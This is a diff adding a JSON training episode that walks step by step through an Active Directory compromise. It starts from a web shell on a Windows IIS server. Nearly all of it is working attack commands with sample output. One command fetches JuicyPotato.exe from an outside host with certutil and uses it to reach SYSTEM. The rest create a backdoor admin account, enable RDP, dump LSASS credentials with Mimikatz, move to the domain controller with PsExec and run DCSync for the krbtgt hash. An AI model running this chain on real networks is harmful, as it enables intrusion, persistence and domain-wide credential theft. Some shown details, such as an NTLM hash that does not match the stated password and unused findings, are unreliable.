@@ -1,0 +1,85 @@
+{
+  "title": "Episode 1: From Web Shell to Domain Admin via Service Misconfiguration",
+  "scenario": "External penetration test of corporate web application. Discovered SQL injection leading to file upload vulnerability. Uploaded web shell and gained low-privilege command execution as IIS service account (iis apppool\\defaultapppool) on Windows Server 2016 web server. Objective: Escalate privileges to SYSTEM, then pivot to Active Directory and compromise Domain Controller.",
+  "steps": [
+    {
+      "step": 1,
+      "description": "Enumerate current privileges and system information",
+      "command": "whoami /priv && systeminfo",
+      "output": "Current user: iis apppool\\defaultapppool\n\nPrivileges:\n  SeAssignPrimaryTokenPrivilege: Disabled\n  SeIncreaseQuotaPrivilege: Disabled\n  SeImpersonatePrivilege: Enabled  <-- EXPLOITABLE!\n  \nOS: Windows Server 2016 Standard\nBuild: 14393\nPatches: KB2919355, KB2919442 (minimal patching)",
+      "explanation": "IIS service account has SeImpersonatePrivilege - vulnerable to Juicy Potato/PrintSpoofer"
+    },
+    {
+      "step": 2,
+      "description": "Check for unquoted service paths",
+      "command": "wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"C:\\\\Windows\\\\\\\\\" | findstr /i /v \"\\\"\"",
+      "output": "BackupService  Company Backup  C:\\Program Files\\Backup App\\service.exe  Auto\nMonitorSvc     System Monitor  C:\\Apps\\Monitor Service\\monitor.exe      Auto\n\nUnquoted service paths found:\n  BackupService: C:\\Program Files\\Backup App\\service.exe\n  MonitorSvc: C:\\Apps\\Monitor Service\\monitor.exe",
+      "explanation": "Found two services with unquoted paths - potential privilege escalation vectors"
+    },
+    {
+      "step": 3,
+      "description": "Check directory permissions for unquoted paths",
+      "command": "icacls \"C:\\Program Files\\Backup App\" && icacls \"C:\\Apps\\Monitor Service\"",
+      "output": "C:\\Program Files\\Backup App: BUILTIN\\Users:(R,RX)\nC:\\Apps\\Monitor Service: BUILTIN\\Users:(OI)(CI)(F)\n\n'Monitor Service' directory writable by Users!",
+      "explanation": "C:\\Apps\\Monitor Service is writable - can place malicious Monitor.exe"
+    },
+    {
+      "step": 4,
+      "description": "Upload Juicy Potato for token impersonation",
+      "command": "certutil -urlcache -f http://10.10.14.50/JuicyPotato.exe C:\\Windows\\Temp\\jp.exe",
+      "output": "****  Online  ****\n  0000  ...  \n  3800\nCertUtil: -URLCache command completed successfully.\n\nJuicyPotato.exe downloaded to C:\\Windows\\Temp\\jp.exe",
+      "explanation": "Downloaded privilege escalation exploit using certutil (Windows built-in)"
+    },
+    {
+      "step": 5,
+      "description": "Test Juicy Potato to verify SYSTEM access",
+      "command": "C:\\Windows\\Temp\\jp.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -a \"/c whoami > C:\\Windows\\Temp\\proof.txt\" -t *",
+      "output": "Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337\n[+] authresult 0\n{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\\SYSTEM\n[+] CreateProcessWithTokenW OK\n\ntype C:\\Windows\\Temp\\proof.txt:\nnt authority\\system",
+      "explanation": "Juicy Potato successful - can execute commands as SYSTEM via token impersonation"
+    },
+    {
+      "step": 6,
+      "description": "Create backdoor user with SYSTEM privileges",
+      "command": "C:\\Windows\\Temp\\jp.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -a \"/c net user hacker P@ssw0rd123! /add && net localgroup administrators hacker /add\" -t *",
+      "output": "[+] CreateProcessWithTokenW OK\nThe command completed successfully.\nThe command completed successfully.\n\nNew user 'hacker' created and added to Administrators",
+      "explanation": "Created admin user via SYSTEM token impersonation for persistent access"
+    },
+    {
+      "step": 7,
+      "description": "Enable RDP for remote access",
+      "command": "C:\\Windows\\Temp\\jp.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -a \"/c reg add 'HKLM\\System\\CurrentControlSet\\Control\\Terminal Server' /v fDenyTSConnections /t REG_DWORD /d 0 /f && netsh advfirewall firewall add rule name='RDP' protocol=TCP dir=in localport=3389 action=allow\" -t *",
+      "output": "The operation completed successfully.\nOk.\n\nRDP enabled and firewall rule added",
+      "explanation": "Enabled RDP for easier access and persistence"
+    },
+    {
+      "step": 8,
+      "description": "RDP as admin and dump credentials with Mimikatz",
+      "command": "rdesktop 10.10.10.20 -u hacker -p 'P@ssw0rd123!'\n\nC:\\> C:\\Tools\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"",
+      "output": "mimikatz # sekurlsa::logonpasswords\n\nAuthentication Id: 0 ; 234567\nUser Name: administrator\nDomain: CORP\nPassword: DomainP@ss2024!\nNTLM: 31d6cfe0d16ae931b73c59d7e0c089c0\n\nAuthentication Id: 0 ; 345678\nUser Name: sqlservice\nDomain: CORP\nNTLM: 8846f7eaee8fb117ad06bdd830b7586c\n\nDomain credentials harvested from memory!",
+      "explanation": "Extracted domain admin and service account credentials from LSASS"
+    },
+    {
+      "step": 9,
+      "description": "Lateral movement to Domain Controller with PSExec",
+      "command": "C:\\Tools\\PsExec.exe \\\\DC01 -u CORP\\administrator -p DomainP@ss2024! cmd.exe",
+      "output": "PsExec v2.34 - Execute processes remotely\n\nMicrosoft Windows [Version 10.0.14393.0]\n(c) 2016 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32> hostname\nDC01\n\nC:\\Windows\\system32> whoami\ncorp\\administrator\n\nAccess to Domain Controller as Domain Admin!",
+      "explanation": "Used harvested credentials to access Domain Controller via PSExec"
+    },
+    {
+      "step": 10,
+      "description": "Dump domain hashes with DCSync",
+      "command": "C:\\Tools\\mimikatz.exe \"privilege::debug\" \"lsadump::dcsync /user:CORP\\administrator\" \"lsadump::dcsync /user:CORP\\krbtgt\" \"exit\"",
+      "output": "mimikatz # lsadump::dcsync /user:CORP\\administrator\n\nSAM Username: administrator\nHash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0\naes256_hmac: a9f3d2b6c4e1f8a7d5c3b2e1a9f8d7c6...\n\nmimikatz # lsadump::dcsync /user:CORP\\krbtgt  \n\nSAM Username: krbtgt\nHash NTLM: 9f86d081884c7d659a2feaa0c55ad015...\naes256_hmac: b2c4d6e8f0a2c4e6f8a0b2c4d6e8f0a2...\n\nDomain Admin and krbtgt hashes extracted!",
+      "explanation": "Performed DCSync to extract all domain credentials including krbtgt for Golden Ticket"
+    }
+  ],
+  "outcome": "Successfully escalated from low-privilege IIS service account to SYSTEM using Juicy Potato token impersonation. Created persistent backdoor user, extracted domain credentials from memory, laterally moved to Domain Controller, and dumped all domain hashes including krbtgt. Achieved full domain compromise with ability to create Golden Tickets for unlimited persistence.",
+  "learning_objectives": [
+    "Identify SeImpersonatePrivilege for token impersonation attacks",
+    "Exploit token impersonation with Juicy Potato/PrintSpoofer",
+    "Create persistent backdoor accounts and enable RDP",
+    "Extract credentials from LSASS memory with Mimikatz",
+    "Perform lateral movement with PSExec",
+    "Use DCSync to extract domain credentials from Domain Controller"
+  ]
+}
